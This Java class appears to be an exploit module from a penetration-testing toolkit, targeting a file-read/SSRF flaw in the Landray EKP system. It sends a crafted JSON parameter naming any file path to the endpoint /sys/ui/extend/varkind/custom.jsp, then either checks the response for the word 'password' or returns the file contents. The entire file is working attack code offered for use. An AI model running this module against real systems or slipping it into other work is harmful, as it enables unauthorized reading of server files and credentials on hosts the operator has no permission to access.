package com.droplab.Controller.BlueEkp.Service;

import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.HttpUtils;
import com.droplab.Utils.InfoUtils;
import com.droplab.service.BugService;
import org.jsoup.Connection;

import java.util.HashMap;
import java.util.Iterator;

public class BlueEkpSSRF extends BugService {
    private final String contentPath = "/sys/ui/extend/varkind/custom.jsp";

    public Object run(String flag) {
        try {
            if (!params.isEmpty()) {
                String url = "";
                String filepath = "";
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("url")) {
                        url = params.get(key);
                    }
                    if (key.equals("filepath")) {
                        filepath = params.get(key);
                    }
                }
                if (!url.equals("") && !filepath.equals("")) {
                    HashMap<String, String> headers = new HashMap<>();
                    CommonUtils.hashMapClone(InfoUtils.headers, headers);
                    headers.put("Referer", url);

                    HashMap paramMap = new HashMap<>();
                    paramMap.put("var", String.format("{\"body\":{\"file\":\"%s\"}}", filepath));
                    Connection.Response response = HttpUtils.post(headers, url + contentPath, paramMap);
                    if (flag.equals("check")) {
                        String body = new String(response.bodyAsBytes());
                        return body.contains("password");
                    } else if (flag.equals("exploit")) {
                        return response;
                    } else {
                        return null;
                    }
                } else {
                    return null;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
        return null;
    }

}
